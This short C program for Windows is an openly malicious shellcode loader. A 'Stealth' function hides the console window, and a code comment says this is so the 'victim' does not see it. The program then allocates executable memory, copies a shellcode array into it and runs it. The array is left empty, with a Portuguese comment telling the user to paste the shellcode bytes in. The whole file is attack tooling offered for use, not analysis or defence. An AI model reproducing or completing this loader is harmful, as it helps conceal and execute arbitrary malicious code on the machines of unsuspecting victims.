#include "Windows.h"


void Stealth() {                                        //Done to not show the comand prompt for the victim ;)
    HWND hWnd;
    AllocConsole();
    hWnd = FindWindowA("ConsoleWindowClass", 0);
    ShowWindow(hWnd, 0);
}


int main()
{
	
	Stealth();
	
	unsigned char shellcode[] = ""//COLE OS BYTES DE SHELLCODE AQUI

	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();

    return 0;
}
